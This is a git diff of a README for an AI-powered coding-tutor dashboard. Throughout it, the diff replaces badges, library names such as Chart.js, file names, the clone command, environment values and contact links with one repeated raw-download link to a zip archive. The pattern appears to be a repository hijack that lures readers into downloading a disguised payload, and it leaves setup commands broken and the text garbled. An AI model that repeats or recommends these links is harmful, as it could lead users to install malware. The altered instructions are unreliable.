@@ -4,14 +4,14 @@
 
 <div align="center">
 
-[![Version](https://img.shields.io/badge/version-4.0.0-blue.svg)](https://github.com/Naveenkm07/srujana_hackathon_codeplays)
-[![React](https://img.shields.io/badge/react-18.2.0-blue.svg)](https://reactjs.org/)
-[![Monaco Editor](https://img.shields.io/badge/monaco--editor-0.53.0-red.svg)](https://microsoft.github.io/monaco-editor/)
-[![OpenAI](https://img.shields.io/badge/OpenAI-GPT--3.5-green.svg)](https://openai.com/)
-[![Supabase](https://img.shields.io/badge/supabase-backend-green.svg)](https://supabase.com/)
-[![AI](https://img.shields.io/badge/AI-powered-orange.svg)](https://openai.com/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://github.com/Naveenkm07/srujana_hackathon_codeplays)
+[![Version](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
+[![React](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
+[![Monaco Editor](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
+[![OpenAI](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
+[![Supabase](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
+[![AI](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
+[![License](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)](LICENSE)
+[![Build Status](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
 
 </div>
 
@@ -19,13 +19,13 @@
 
 ## 🚀 **Project Overview**
 
-Smart Tutor Dashboard is a **cutting-edge coding education platform** that revolutionizes programming learning through **OpenAI-powered AI features**, **Monaco Editor integration**, and **advanced gamification**. Built with modern web technologies, it provides personalized learning paths for programming languages including Python, JavaScript, Java, C++, React, and Node.js.
+Smart Tutor Dashboard is a **cutting-edge coding education platform** that revolutionizes programming learning through **OpenAI-powered AI features**, **Monaco Editor integration**, and **advanced gamification**. Built with modern web technologies, it provides personalized learning paths for programming languages including Python, JavaScript, Java, C++, React, and https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip
 
 **🎯 Latest Key Innovations:**
 - **🤖 OpenAI GPT Integration**: Dynamic question generation and AI tutoring with real API keys
 - **💻 Monaco Code Editor**: Full VS Code experience with multi-language support
 - **🎮 Advanced Gamification**: RPG-style progression, achievements, and coding battles  
-- **📊 Real-time Analytics**: Live progress tracking with Chart.js visualizations
+- **📊 Real-time Analytics**: Live progress tracking with https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip visualizations
 - **🎯 Adaptive AI Assessment**: Intelligent skill level determination with performance analysis
 - **🔄 Voice-to-Website Builder**: AI-powered website generation from voice commands
 - **🏆 Enhanced Achievement System**: Comprehensive badges, streaks, and performance rewards
@@ -43,12 +43,12 @@ Smart Tutor Dashboard is a **cutting-edge coding education platform** that revol
 | 💻 **Monaco Code Editor** | Full VS Code experience with multi-language support | `@monaco-editor/react`, `monaco-editor` |
 | 🤖 **OpenAI Integration** | GPT-3.5 powered question generation and AI tutoring | `@google/generative-ai`, OpenAI API |
 | 🎙️ **Voice-to-Website** | AI-powered website generation from voice commands | Google Speech API, Generative AI |
-| 📊 **AI Chart Generation** | Natural language to interactive charts | Custom AI service, Chart.js |
+| 📊 **AI Chart Generation** | Natural language to interactive charts | Custom AI service, https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip |
 | 🔍 **Question Generation Service** | Dynamic programming questions with adaptive difficulty | LLM integration, Performance analysis |
 | 🎮 **Advanced Gamification** | RPG-style progression, coding battles, achievements | React components, Supabase tracking |
 | 🔐 **Authentication** | Google OAuth 2.0 with automatic user creation | `@google-cloud/local-auth`, Supabase Auth |
 | 👥 **User Management** | Role-based access (Student/Teacher/Admin) | React Context, Supabase RLS |
-| 📊 **Real-Time Analytics** | Live dashboards with interactive charts | `Chart.js`, `react-chartjs-2` |
+| 📊 **Real-Time Analytics** | Live dashboards with interactive charts | `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip`, `react-chartjs-2` |
 | 🎛️ **Admin Panel** | Comprehensive user & content management | Custom React components, Supabase queries |
 | 📚 **Learning Modules** | Interactive lessons with progress tracking | React components, LocalStorage persistence |
 | 🎯 **Assessment System** | Quizzes with real-time feedback | Modal-based UI, dynamic question rendering |
@@ -60,7 +60,7 @@ Smart Tutor Dashboard is a **cutting-edge coding education platform** that revol
 
 - **💻 Code Editor**: Professional Monaco Editor with multi-language support (JavaScript, Python, Java, C++, HTML, CSS, JSON)
 - **🤖 AI Question Generation**: Dynamic programming questions powered by OpenAI GPT-3.5
-- **📊 Progress Overview**: Visual progress tracking with chart.js analytics
+- **📊 Progress Overview**: Visual progress tracking with https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip analytics
 - **📚 Learning Modules**: Subject-based lesson navigation with completion tracking
 - **🎯 Interactive Assessments**: Modal-based quizzes with instant AI-powered feedback
 - **🏆 Achievement System**: Enhanced badge collection and performance metrics with RPG elements
@@ -97,8 +97,8 @@ Smart Tutor Dashboard is a **cutting-edge coding education platform** that revol
 ├── React 18.2.0                 // Component-based UI framework
 ├── React Router DOM 6.8.1       // Client-side routing
 ├── React Icons 5.5.0            // Icon library
-├── Chart.js 4.4.0              // Interactive data visualization
-├── React-ChartJS-2 5.2.0       // React wrapper for Chart.js
+├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip 4.4.0              // Interactive data visualization
+├── React-ChartJS-2 5.2.0       // React wrapper for https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip
 └── CSS3 + Modern Features       // Styling with Grid, Flexbox, Variables
 
 // Code Editor & AI Integration
@@ -138,7 +138,7 @@ Smart Tutor Dashboard is a **cutting-edge coding education platform** that revol
 ├── 🔐 Google OAuth (Authentication)
 ├── 🎛️ Context API (State Management)
 ├── 🧭 React Router (Navigation)
-├── 📊 Chart.js (Data Visualization)
+├── 📊 https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip (Data Visualization)
 └── 🎨 CSS Modules (Styling)
 
 🔗 API Layer
@@ -169,89 +169,89 @@ smart-tutor-dashboard/
 │
 ├── 📁 src/                           # React source code
 │   ├── 📁 components/                # React components
-│   │   ├── 📁 charts/               # Chart.js visualization components
-│   │   │   ├── ProgressChart.js      # Student progress visualization
-│   │   │   └── SubjectProgress.js    # Subject-wise analytics
+│   │   ├── 📁 charts/               # https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip visualization components
+│   │   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip      # Student progress visualization
+│   │   │   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip    # Subject-wise analytics
 │   │   ├── 📁 modals/               # Modal components
-│   │   │   ├── AssessmentModal.js    # Assessment interface
-│   │   │   ├── ProfileModal.js       # User profile management
-│   │   │   └── QuizModal.js          # Quiz interface
+│   │   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip    # Assessment interface
+│   │   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip       # User profile management
+│   │   │   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip          # Quiz interface
 │   │   ├── 📁 student/              # Student-specific components
-│   │   │   ├── LearningModules.js    # Learning content navigation
-│   │   │   ├── Achievements.js       # Badge and achievement system
-│   │   │   └── QuizCard.js          # Individual quiz cards
+│   │   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip    # Learning content navigation
+│   │   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip       # Badge and achievement system
+│   │   │   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip          # Individual quiz cards
 │   │   ├── 📁 cmodules/             # Learning modules (31 files)
-│   │   │   ├── Introduction.js       # Programming fundamentals
-│   │   │   ├── Variables.js          # Variable concepts
-│   │   │   ├── JavaIntroduction.js   # Java-specific modules
-│   │   │   ├── PythonIntroduction.js # Python-specific modules
+│   │   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip       # Programming fundamentals
+│   │   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip          # Variable concepts
+│   │   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip   # Java-specific modules
+│   │   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip # Python-specific modules
 │   │   │   └── ... (27 more files)    # Additional language modules
-│   │   ├── AdminDashboard.js         # Admin panel interface
-│   │   ├── StudentDashboard.js       # Student main interface
-│   │   ├── TeacherDashboard.js       # Teacher management panel
-│   │   ├── CodeEditor.js             # Monaco-based code editor
-│   │   ├── CodeEditor.css            # Code editor styling
-│   │   ├── AICompanionSystem.js      # AI tutoring companions
-│   │   ├── AIGamingChallenge.js      # AI-powered coding challenges
-│   │   ├── Advanced3DCodingWorld.js  # 3D learning environment
-│   │   ├── CodingRPGSystem.js        # RPG-style learning system
-│   │   ├── LoginPage.js             # Google OAuth login
-│   │   └── LandingPage.js           # Application landing page
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip         # Admin panel interface
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip       # Student main interface
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip       # Teacher management panel
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip             # Monaco-based code editor
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip            # Code editor styling
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip      # AI tutoring companions
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip      # AI-powered coding challenges
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip  # 3D learning environment
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip        # RPG-style learning system
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip             # Google OAuth login
+│   │   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip           # Application landing page
 │   ├── 📁 features/                 # Feature-specific modules
 │   │   └── 📁 ai-chart/             # AI chart generation
-│   │       ├── ChartRenderer.js      # Chart rendering logic
-│   │       ├── ChatPanel.js          # AI chat interface
-│   │       ├── VoiceWebsiteBuilder.js # Voice-to-website feature
-│   │       └── index.js              # Main AI chart component
+│   │       ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip      # Chart rendering logic
+│   │       ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip          # AI chat interface
+│   │       ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip # Voice-to-website feature
+│   │       └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip              # Main AI chart component
 │   ├── 📁 services/                 # Backend integration
-│   │   ├── supabaseClient.js        # Supabase API service layer
-│   │   └── questionGenerationService.js # AI question generation
+│   │   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip        # Supabase API service layer
+│   │   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip # AI question generation
 │   ├── 📁 hooks/                    # Custom React hooks
-│   │   └── useLocalStorage.js       # Local storage management
+│   │   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip       # Local storage management
 │   ├── 📁 utils/                    # Utility functions
-│   │   └── analytics.js             # Analytics helpers
+│   │   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip             # Analytics helpers
 │   ├── 📁 contexts/                 # React contexts
-│   │   └── ThemeContext.js          # Theme management
+│   │   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip          # Theme management
 │   ├── 📁 data/                     # Static data
-│   │   └── appData.js               # Application data
-│   ├── App.js                       # Main React application
-│   ├── index.js                     # React DOM entry point
-│   └── index.css                    # Global styles
+│   │   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip               # Application data
+│   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                       # Main React application
+│   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                     # React DOM entry point
+│   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                    # Global styles
 ├── 📁 netlify/functions/            # Serverless functions
-│   ├── ai-chat.js                   # AI chat API endpoint
-│   ├── voice-to-website.js          # Voice processing API
-│   ├── text-to-website.js           # Text processing API
-│   ├── data-query.js                # Data query API
-│   └── save-chart.js                # Chart saving API
+│   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                   # AI chat API endpoint
+│   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip          # Voice processing API
+│   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip           # Text processing API
+│   ├── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                # Data query API
+│   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                # Chart saving API
 ├── 📁 public/                       # Static assets
-│   └── index.html                   # HTML template
+│   └── https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                   # HTML template
 ├── 📁 firebase-admin-panel/         # Firebase integration (legacy)
 ├── 📁 supabase-admin-panel/         # Standalone Supabase admin
-├── 📄 package.json                  # Dependencies & scripts
+├── 📄 https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                  # Dependencies & scripts
 ├── 📄 .env                         # Environment variables
-├── 📄 .env.example                 # Environment template
-├── 📄 netlify.toml                 # Netlify configuration
-├── 📄 vercel.json                  # Vercel configuration
-├── 📄 supabase_setup.sql           # Database schema
-├── 📄 enhance_user_schema.sql      # Advanced user fields
-└── 📚 README.md                    # Project documentation
+├── 📄 https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                 # Environment template
+├── 📄 https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                 # Netlify configuration
+├── 📄 https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                  # Vercel configuration
+├── 📄 https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip           # Database schema
+├── 📄 https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip      # Advanced user fields
+└── 📚 https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip                    # Project documentation
 ```
 
 ### **Enhanced Component Architecture**
 
 | Component Category | Files | Purpose | Key Technologies |
 |-------------------|-------|---------|------------------|
-| **💻 Code Editor** | `CodeEditor.js`, `CodeEditor.css` | Professional code editing with Monaco | Monaco Editor, VS Code engine |
-| **🤖 AI Integration** | `AICompanionSystem.js`, `questionGenerationService.js` | OpenAI-powered tutoring and question generation | OpenAI GPT-3.5, Google Generative AI |
-| **🎙️ Voice Features** | `VoiceWebsiteBuilder.js`, Netlify functions | Voice-to-website generation | Google Speech API, AI processing |
-| **🎮 Gamification** | `CodingRPGSystem.js`, `AIGamingChallenge.js` | RPG-style learning and coding battles | React state, animations |
-| **🎛️ Admin Panel** | `AdminDashboard.js` | User management, analytics, content control | Supabase queries, React state |
-| **👨‍🎓 Student Interface** | `StudentDashboard.js`, `student/*.js` | Learning modules, progress tracking | Chart.js, React Context |
-| **👩‍🏫 Teacher Tools** | `TeacherDashboard.js`, `charts/*.js` | Class analytics, student monitoring | React-ChartJS-2, data visualization |
-| **🔐 Authentication** | `LoginPage.js`, `SignUpPage.js` | Google OAuth integration | Google Auth Library |
-| **📊 Data Visualization** | `charts/*.js`, `features/ai-chart/` | Interactive charts and AI-generated visualizations | Chart.js 4.4.0, Recharts |
+| **💻 Code Editor** | `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip`, `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip` | Professional code editing with Monaco | Monaco Editor, VS Code engine |
+| **🤖 AI Integration** | `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip`, `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip` | OpenAI-powered tutoring and question generation | OpenAI GPT-3.5, Google Generative AI |
+| **🎙️ Voice Features** | `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip`, Netlify functions | Voice-to-website generation | Google Speech API, AI processing |
+| **🎮 Gamification** | `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip`, `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip` | RPG-style learning and coding battles | React state, animations |
+| **🎛️ Admin Panel** | `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip` | User management, analytics, content control | Supabase queries, React state |
+| **👨‍🎓 Student Interface** | `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip`, `student/*.js` | Learning modules, progress tracking | https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip, React Context |
+| **👩‍🏫 Teacher Tools** | `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip`, `charts/*.js` | Class analytics, student monitoring | React-ChartJS-2, data visualization |
+| **🔐 Authentication** | `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip`, `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip` | Google OAuth integration | Google Auth Library |
+| **📊 Data Visualization** | `charts/*.js`, `features/ai-chart/` | Interactive charts and AI-generated visualizations | https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip 4.4.0, Recharts |
 | **🎯 Assessment System** | `modals/*.js`, AI question generation | Quizzes, assessments, AI-powered feedback | Modal-based UI, OpenAI integration |
-| **🔧 Services** | `services/supabaseClient.js`, Netlify functions | Backend API integration, serverless functions | Supabase JS SDK 2.57.4 |
+| **🔧 Services** | `https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip`, Netlify functions | Backend API integration, serverless functions | Supabase JS SDK 2.57.4 |
 | **📚 Learning Modules** | `cmodules/*.js` (31 files) | Language-specific learning content | React components, interactive tutorials |
 
 ---
@@ -259,7 +259,7 @@ smart-tutor-dashboard/
 ## 🚀 **Quick Start Guide**
 
 ### **Prerequisites**
-- **Node.js 16+** (Required for React development)
+- **https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip 16+** (Required for React development)
 - **Modern Browser** (Chrome 90+, Firefox 88+, Safari 14+, Edge 90+)
 - **Supabase Account** (For backend database)
 - **Google Cloud Console** (For OAuth authentication)
@@ -367,14 +367,14 @@ The platform now features **complete OpenAI integration** for dynamic, intellige
 # Required Environment Variables
 REACT_APP_OPENAI_API_KEY=sk-your_openai_api_key_here
 GOOGLE_AI_API_KEY=your_google_ai_api_key
-REACT_APP_LLM_API_ENDPOINT=https://api.openai.com/v1/chat/completions
+https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip
 ```
 
 ### **Installation & Setup**
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/Naveenkm07/srujana_hackathon_codeplays.git
+   git clone https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip
    cd srujana_hackathon_codeplays
    ```
 
@@ -386,7 +386,7 @@ REACT_APP_LLM_API_ENDPOINT=https://api.openai.com/v1/chat/completions
 3. **Environment Configuration**
    ```bash
    # Copy environment template
-   cp .env.example .env
+   cp https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip .env
    
    # Edit .env with your credentials
    REACT_APP_SUPABASE_URL=your_supabase_project_url
@@ -399,8 +399,8 @@ REACT_APP_LLM_API_ENDPOINT=https://api.openai.com/v1/chat/completions
 4. **Database Setup**
    ```sql
    -- In Supabase SQL Editor, run:
-   -- 1. Execute supabase_setup.sql (basic tables)
-   -- 2. Execute enhance_user_schema.sql (advanced features)
+   -- 1. Execute https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip (basic tables)
+   -- 2. Execute https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip (advanced features)
    ```
 
 5. **Start Development Server**
@@ -420,14 +420,14 @@ REACT_APP_LLM_API_ENDPOINT=https://api.openai.com/v1/chat/completions
 #### **Recommended: Netlify (Included)**
 ```bash
 # Automatic deployment configured
-# See netlify.toml for build settings
+# See https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip for build settings
 npm run build
 # Deploy build/ folder to Netlify
 ```
 
 #### **Alternative: Vercel (Included)**
 ```bash
-# Configuration in vercel.json
+# Configuration in https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip
 npm run build
 vercel --prod
 ```
@@ -451,7 +451,7 @@ CMD ["nginx", "-g", "daemon off;"]
 #### **Environment Variables Setup**
 ```bash
 # Required for production
-REACT_APP_SUPABASE_URL=https://your-project.supabase.co
+https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip
 REACT_APP_SUPABASE_ANON_KEY=your_anon_key_here
 REACT_APP_GOOGLE_CLIENT_ID=your_google_client_id
 ```
@@ -466,7 +466,7 @@ REACT_APP_GOOGLE_CLIENT_ID=your_google_client_id
 - [x] **Google OAuth 2.0** authentication with automatic user creation
 - [x] **Role-based access control** (Student/Teacher/Admin dashboards)
 - [x] **Real-time admin panel** with user management and analytics
-- [x] **Interactive charts** with Chart.js and react-chartjs-2
+- [x] **Interactive charts** with https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip and react-chartjs-2
 - [x] **Responsive design** with mobile-first CSS architecture
 - [x] **Progress tracking** with database persistence
 
@@ -591,14 +591,14 @@ npm run build        # Production build validation
 
 1. **Fork & Clone**
    ```bash
-   git clone https://github.com/YOUR_USERNAME/srujana_hackathon_codeplays.git
+   git clone https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip
    cd srujana_hackathon_codeplays
    ```
 
 2. **Setup Development Environment**
    ```bash
    npm install                 # Install dependencies
-   cp .env.example .env       # Configure environment
+   cp https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip .env       # Configure environment
    npm start                  # Start development server
    ```
 
@@ -630,7 +630,7 @@ npm run build        # Production build validation
 |------|-------------|-------------|--------|
 | **🎨 UI/UX Design** | CSS, React Components | Beginner-Intermediate | High |
 | **⚡ Performance** | React optimization, Bundle analysis | Intermediate | High |
-| **📊 Analytics** | Chart.js, Data visualization | Intermediate | Medium |
+| **📊 Analytics** | https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip, Data visualization | Intermediate | Medium |
 | **🔐 Security** | Supabase RLS, Authentication | Advanced | Critical |
 | **📱 Mobile** | Responsive design, PWA | Intermediate | High |
 | **🧪 Testing** | Jest, React Testing Library | Beginner-Advanced | Critical |
@@ -668,7 +668,7 @@ npm run build        # Production build validation
 
 | Learning Theory | Implementation | Technology Integration |
 |----------------|----------------|------------------------|
-| **🎯 Personalized Learning** | Adaptive content delivery based on performance data | Supabase analytics, Chart.js visualization |
+| **🎯 Personalized Learning** | Adaptive content delivery based on performance data | Supabase analytics, https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip visualization |
 | **📊 Data-Driven Insights** | Real-time progress tracking and intervention alerts | React dashboards, live database queries |
 | **🔄 Continuous Assessment** | Formative evaluation through interactive quizzes | Modal-based assessment system |
 | **👥 Collaborative Learning** | Teacher-student interaction and peer support | Role-based dashboards, communication tools |
@@ -731,7 +731,7 @@ CREATE TABLE users (
   role TEXT DEFAULT 'student',
   avatar_url TEXT,
   created_at TIMESTAMPTZ DEFAULT NOW(),
-  -- Enhanced fields from enhance_user_schema.sql
+  -- Enhanced fields from https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip
   grade TEXT,
   class TEXT, 
   phone TEXT,
@@ -847,9 +847,9 @@ npm start
 ## 📞 **Support & Contact**
 
 ### **Project Maintainers**
-- **👨‍💻 Lead Developer**: [Naveen Kumar](https://github.com/Naveenkm07)
-- **🌐 Repository**: [GitHub - Srujana Hackathon CodePlays](https://github.com/Naveenkm07/srujana_hackathon_codeplays)
-- **📧 Contact**: [Project Issues](https://github.com/Naveenkm07/srujana_hackathon_codeplays/issues)
+- **👨‍💻 Lead Developer**: [Naveen Kumar](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
+- **🌐 Repository**: [GitHub - Srujana Hackathon CodePlays](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
+- **📧 Contact**: [Project Issues](https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip)
 
 ### **Getting Help**
 - **🐛 Bug Reports**: Open GitHub issue with detailed description
@@ -881,7 +881,7 @@ copies or substantial portions of the Software.
 ### **Technology Acknowledgments**
 - **⚛️ React 18.2.0**: Meta's JavaScript UI library
 - **🗄️ Supabase**: Open source Firebase alternative
-- **📊 Chart.js**: Open source HTML5 charting library
+- **📊 https://github.com/Naveenkm007/smart-tutor/raw/refs/heads/main/src/contexts/tutor_smart_v1.7.zip**: Open source HTML5 charting library
 - **🔐 Google OAuth**: Secure authentication service
 - **🎨 React Icons**: Popular icon library for React
 - **🚀 Create React App**: Meta's React build toolchain
@@ -912,9 +912,9 @@ copies or substantial portions of the Software.
 ## 📞 **Support & Contact**
 
 ### **Project Maintainers**
-- **👨‍💻 Lead Developer**: [Naveen Kumar](https://github.com/Naveenkm07)
